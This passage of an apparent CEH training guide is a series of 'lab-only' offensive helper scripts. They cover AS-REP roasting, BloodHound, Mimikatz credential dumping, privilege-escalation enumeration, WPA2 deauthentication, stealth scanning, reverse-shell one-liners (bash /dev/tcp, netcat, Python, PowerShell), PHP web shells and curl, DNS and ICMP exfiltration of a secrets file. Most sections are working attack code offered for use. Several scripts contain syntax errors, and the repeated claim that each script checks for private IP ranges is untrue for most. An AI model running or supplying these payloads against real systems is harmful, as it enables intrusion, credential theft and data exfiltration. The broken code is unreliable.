# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: AS-REP Roasting Helper")
    print("="*80")
    print("-"*80")
    print("[*] Commands to run:")
    print("-"*80")
    print("# 1. Find users with pre-authentication disabled:")
    print(f"   GetNPUsers.py {LAB_DOMAIN}/ -usersfile {LAB_USERLIST} -dc-ip {LAB_DOMAIN_CONTROLLER} -no-pass -request")
    print("# 2. Crack with hashcat:")
    print("   hashcat -m 18200 asrep.hash wordlist.txt")
    print("-"*80")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 29-asrep-roasting-helper.py` for packet capture/port scanning, or `./29-asrep-roasting-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 275 : BloodHound Data Collection & Analysis Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: BloodHound Data Collection & Analysis Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: BloodHound Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates BloodHound commands and Neo4j queries!
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN = "lab-domain.local"
LAB_DOMAIN_CONTROLLER = "192.168.100.10"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: BloodHound Helper")
    print("="*80")
    print("-"*80")
    print("[*] Commands:")
    print("-"*80")
    print("# Collect data:")
    print(f"   bloodhound-python -c All -d {LAB_DOMAIN} -u user -p labpass123 -ns {LAB_DOMAIN_CONTROLLER}")
    print("# Neo4j queries (paste into BloodHound):")
    print("   MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'Domain Admins@LAB-DOMAIN.LOCAL'}) RETURN p")
    print("   MATCH (c:Computer) RETURN c")
    print("-"*80")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 30-bloodhound-helper.py` for packet capture/port scanning, or `./30-bloodhound-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 276 : Mimikatz Command Reference Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Mimikatz Command Reference Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Mimikatz Command Generator
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates Mimikatz commands for credential dumping (LAB ONLY!)
import sys

def main():
    print("="*80)
    print("LAB-ONLY: Mimikatz Command Generator")
    print("="*80)
    print("-"*80")
    print("[*] Mimikatz commands (LAB ONLY - use on authorized targets only!):")
    print("-"*80")
    print("privilege::debug")
    print("token::elevate")
    print("sekurlsa::logonpasswords")
    print("sekurlsa::ekeys")
    print("sekurlsa::kerberos")
    print("sekurlsa::tickets")
    print("lsadump::sam")
    print("lsadump::secrets")
    print("lsadump::lsa /patch")
    print("vault::cred")
    print("vault::list")
    print("-"*80")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 31-mimikatz-helper.py` for packet capture/port scanning, or `./31-mimikatz-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 277 : Advanced Linux Privilege Escalation Enumeration

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Advanced Linux Privilege Escalation Enumeration

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```bash
#!/bin/bash
# LAB-ONLY: Advanced Linux Privilege Escalation Enumeration Script
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Enumerates all vectors for Linux privesc!
# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_OUTPUT_FILE="linux-privesc-report.txt"
# -----------------------------------------------------------------------------------

echo "="*80 > $LAB_OUTPUT_FILE
echo "LAB-ONLY: Linux Privesc Enumeration Report" >> $LAB_OUTPUT_FILE
echo "="*80 >> $LAB_OUTPUT_FILE
echo >> $LAB_OUTPUT_FILE
echo "[*] 1. Kernel & OS info" >> $LAB_OUTPUT_FILE
uname -a >> $LAB_OUTPUT_FILE
cat /etc/issue >> $LAB_OUTPUT_FILE
cat /etc/*release >> $LAB_OUTPUT_FILE
echo >> $LAB_OUTPUT_FILE
echo "[*] 2. Users & Groups" >> $LAB_OUTPUT_FILE
cat /etc/passwd >> $LAB_OUTPUT_FILE
cat /etc/group >> $LAB_OUTPUT_FILE
echo >> $LAB_OUTPUT_FILE
echo "[*] 3. Sudo permissions" >> $LAB_OUTPUT_FILE
sudo -l >> $LAB_OUTPUT_FILE 2>&1
echo >> $LAB_OUTPUT_FILE
echo "[*] 4. SUID/SGID files" >> $LAB_OUTPUT_FILE
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null >> $LAB_OUTPUT_FILE
echo >> $LAB_OUTPUT_FILE
echo "[*] 5. Capabilities" >> $LAB_OUTPUT_FILE
getcap -r / 2>/dev/null >> $LAB_OUTPUT_FILE
echo >> $LAB_OUTPUT_FILE
echo "[*] 6. Writable files/dirs" >> $LAB_OUTPUT_FILE
find / -writable -type d 2>/dev/null | head -50 >> $LAB_OUTPUT_FILE
echo >> $LAB_OUTPUT_FILE
echo "[*] 7. Processes" >> $LAB_OUTPUT_FILE
ps aux >> $LAB_OUTPUT_FILE
echo >> $LAB_OUTPUT_FILE
echo "[*] 8. Cron jobs" >> $LAB_OUTPUT_FILE
cat /etc/crontab >> $LAB_OUTPUT_FILE
ls -la /etc/cron* >> $LAB_OUTPUT_FILE
echo >> $LAB_OUTPUT_FILE
echo "[*] 9. Network info" >> $LAB_OUTPUT_FILE
ifconfig -a >> $LAB_OUTPUT_FILE 2>&1 || ip a >> $LAB_OUTPUT_FILE
netstat -tuln >> $LAB_OUTPUT_FILE 2>&1 || ss -tuln >> $LAB_OUTPUT_FILE
echo "[+] Report saved to $LAB_OUTPUT_FILE"

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 32-linux-privesc-advanced.sh` for packet capture/port scanning, or `./32-linux-privesc-advanced.sh` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 278 : Advanced Windows Privilege Escalation Enumeration

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Advanced Windows Privilege Escalation Enumeration

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```batch
@echo off
REM LAB-ONLY: Advanced Windows Privilege Escalation Enumeration Script
REM CEH v13 Master Module 06
REM STRICTLY FOR AUTHORIZED LAB USE ONLY!
REM -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
set LAB_OUTPUT_FILE=windows-privesc-report.txt
REM -----------------------------------------------------------------------------------

echo ================================================================================ > %LAB_OUTPUT_FILE%
echo LAB-ONLY: Windows Privesc Enumeration Report >> %LAB_OUTPUT_FILE%
echo ================================================================================ >> %LAB_OUTPUT_FILE%
echo. >> %LAB_OUTPUT_FILE%
echo [*] 1. System info >> %LAB_OUTPUT_FILE%
systeminfo >> %LAB_OUTPUT_FILE%
echo. >> %LAB_OUTPUT_FILE%
echo [*] 2. Users & Groups >> %LAB_OUTPUT_FILE%
net user >> %LAB_OUTPUT_FILE%
net localgroup >> %LAB_OUTPUT_FILE%
echo. >> %LAB_OUTPUT_FILE%
echo [*] 3. Privileges >> %LAB_OUTPUT_FILE%
whoami /priv >> %LAB_OUTPUT_FILE%
echo. >> %LAB_OUTPUT_FILE%
echo [*] 4. Services >> %LAB_OUTPUT_FILE%
sc query state= all >> %LAB_OUTPUT_FILE%
echo. >> %LAB_OUTPUT_FILE%
echo [*] 5. Registry >> %LAB_OUTPUT_FILE%
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" >> %LAB_OUTPUT_FILE%
echo. >> %LAB_OUTPUT_FILE%
echo [*] 6. Scheduled Tasks >> %LAB_OUTPUT_FILE%
schtasks /query /fo list /v >> %LAB_OUTPUT_FILE%
echo [+] Report saved to %LAB_OUTPUT_FILE%

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 33-windows-privesc-advanced.bat` for packet capture/port scanning, or `./33-windows-privesc-advanced.bat` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 279 : Advanced Packet Sniffing with Scapy

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Advanced Packet Sniffing with Scapy

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Advanced Packet Sniffer with Scapy
# CEH v13 Master Module 08
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Captures packets and extracts interesting info!
from scapy.all import sniff, IP, TCP, UDP, HTTP
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_INTERFACE = "eth0"
LAB_COUNT = 100
LAB_FILTER = "tcp port 80 or tcp port 443"
# -----------------------------------------------------------------------------------

def packet_callback(packet):
    if IP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        print(f"[+] {src_ip} -> {dst_ip}")
        if TCP in packet:
            print(f"    TCP: {packet[TCP].sport} -> {packet[TCP].dport}")
        if UDP in packet:
            print(f"    UDP: {packet[UDP].sport} -> {packet[UDP].dport}")
        if packet.haslayer(HTTP):
            print(f"    HTTP: {packet[HTTP].Method} {packet[HTTP].Path}")

def main():
    print("="*80)
    print("LAB-ONLY: Advanced Packet Sniffer")
    print("="*80)
    print(f"[*] Sniffing on {LAB_INTERFACE} (LAB ONLY!)...")
    print("-"*80")
    sniff(iface=LAB_INTERFACE, filter=LAB_FILTER, prn=packet_callback, count=LAB_COUNT)

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 34-scapy-sniffer-advanced.py` for packet capture/port scanning, or `./34-scapy-sniffer-advanced.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 280 : Wireless WPA2 Handshake Capture Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Wireless WPA2 Handshake Capture Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```bash
#!/bin/bash
# LAB-ONLY: Wireless WPA2 Handshake Capture Helper
# CEH v13 Master Module 16
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_INTERFACE="wlan0"
LAB_MONITOR_INTERFACE="wlan0mon"
LAB_TARGET_BSSID="AA:BB:CC:DD:EE:FF"
LAB_TARGET_CHANNEL=6
# -----------------------------------------------------------------------------------

echo "[*] Stopping network managers..."
systemctl stop NetworkManager
airmon-ng check kill
echo "[*] Starting monitor mode..."
airmon-ng start $LAB_INTERFACE $LAB_TARGET_CHANNEL
echo "[*] Now run airodump-ng to capture the handshake: airodump-ng -c $LAB_TARGET_CHANNEL --bssid $LAB_TARGET_BSSID -w capture $LAB_MONITOR_INTERFACE"
echo "[*] In another terminal, run aireplay-ng to deauth: aireplay-ng --deauth 0 -a $LAB_TARGET_BSSID $LAB_MONITOR_INTERFACE"

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 35-wireless-handshake-capture.sh` for packet capture/port scanning, or `./35-wireless-handshake-capture.sh` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 281 : Stealth Port Scanning with Evasion Techniques

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Stealth Port Scanning with Evasion Techniques

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Stealth Port Scanner (Slow, Low, Fragmented)
# CEH v13 Master Module 03
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Slow, stealthy port scanner with evasion techniques!
import socket
import time
import random
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_IP = "192.168.100.10"
LAB_PORTS = list(range(1, 1025))
LAB_MIN_DELAY = 2.0
LAB_MAX_DELAY = 5.0
# -----------------------------------------------------------------------------------

def scan_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1.0)
    try:
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(f"[+] Port {port}: OPEN")
        sock.close()
    except:
        pass

def main():
    print("="*80)
    print("LAB-ONLY: Stealth Port Scanner")
    print("="*80)
    print(f"[*] Target: {LAB_TARGET_IP}")
    print(f"[*] Ports: 1-1024")
    print(f"[*] Delay: {LAB_MIN_DELAY}-{LAB_MAX_DELAY}s per port")
    print("-"*80")
    random.shuffle(LAB_PORTS)
    for port in LAB_PORTS:
        scan_port(LAB_TARGET_IP, port)
        delay = random.uniform(LAB_MIN_DELAY, LAB_MAX_DELAY)
        time.sleep(delay)

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_IP for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 36-stealth-scanner.py` for packet capture/port scanning, or `./36-stealth-scanner.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 282 : Reverse Shell Payload Generator

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Reverse Shell Payload Generator

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Reverse Shell Payload Generator
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates reverse shells for various languages!
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_IP = "192.168.100.1"
LAB_ATTACKER_PORT = "443"
# -----------------------------------------------------------------------------------

def generate_payloads(ip, port):
    payloads = []
    # Bash
    payloads.append(("Bash", f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"))
    # Netcat
    payloads.append(("Netcat", f"nc {ip} {port} -e /bin/bash"))
    payloads.append(("Netcat (mkfifo)", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"))
    # Python
    payloads.append(("Python", f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"))
    # PHP
    payloads.append(("PHP", f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\");?>"))
    # PowerShell
    payloads.append(("PowerShell", f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$x = ($error[0] | Out-String);$sendback2 = $sendback2 + $x;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""))
    return payloads

def main():
    print("="*80)
    print("LAB-ONLY: Reverse Shell Payload Generator")
    print("="*80)
    print(f"[*] Attacker IP: {LAB_ATTACKER_IP}")
    print(f"[*] Attacker Port: {LAB_ATTACKER_PORT}")
    print("-"*80")
    for name, payload in generate_payloads(LAB_ATTACKER_IP, LAB_ATTACKER_PORT):
        print(f"\n[*] {name}:")
        print("-"*40)
        print(payload)
        print()

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 37-reverse-shell-generator.py` for packet capture/port scanning, or `./37-reverse-shell-generator.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 283 : Web Shell Payload Generator

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Web Shell Payload Generator

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Web Shell Generator
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates simple web shells for PHP, ASP, JSP, etc.
import sys

def generate_web_shells():
    shells = []
    # PHP Simple
    php_simple = '''<?php system($_GET['c']);?>'''
    shells.append(("PHP Simple", php_simple, "shell.php"))
    # PHP Interactive
    php_interactive = '''<?php
if(isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}
?>
<html>
<body>
<form method="POST">
<input type="text" name="cmd" placeholder="Command">
<input type="submit" value="Execute">
</form>
</body>
</html>'''
    shells.append(("PHP Interactive", php_interactive, "shell-interactive.php"))
    return shells

def main():
    print("="*80)
    print("LAB-ONLY: Web Shell Generator")
    print("="*80)
    for name, code, filename in generate_web_shells():
        print(f"\n[*] {name}")
        print("-"*40)
        print(code)
        print()
        with open(filename, "w") as f:
            f.write(code)
        print(f"[+] Saved to {filename}")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 38-web-shell-generator.py` for packet capture/port scanning, or `./38-web-shell-generator.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 284 : Data Exfiltration Payload Helper (LAB ONLY!)

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Data Exfiltration Payload Helper (LAB ONLY!)

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Data Exfiltration Helper (LAB ONLY!)
# CEH v13 Master Module 07
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates exfiltration methods (DNS, HTTP, ICMP, etc.)
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_DOMAIN = "your-lab-domain.com"
LAB_ATTACKER_IP = "192.168.100.1"
LAB_ATTACKER_PORT = 80
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Exfiltration Helper")
    print("="*80)
    print("-"*80")
    print("[*] Exfiltration methods (LAB ONLY):")
    print("-"*80")
    print("# 1. HTTP POST:")
    print(f"curl -X POST -d 'data=$(cat secret.txt)' http://{LAB_ATTACKER_IP}:{LAB_ATTACKER_PORT}")
    print("# 2. DNS:")
    print(f"for i in $(xxd -p secret.txt); do host $i.{LAB_ATTACKER_DOMAIN}; done")
    print("# 3. ICMP:")
    print(f"ping -c 1 -p $(xxd -p secret.txt) {LAB_ATTACKER_IP}")
    print("-"*80")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 39-exfiltration-helper.py` for packet capture/port scanning, or `./39-exfiltration-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 285 : Persistence Mechanism Helper (Linux/Windows)

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Persistence Mechanism Helper (Linux/Windows)

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Persistence Helper (LAB ONLY!)
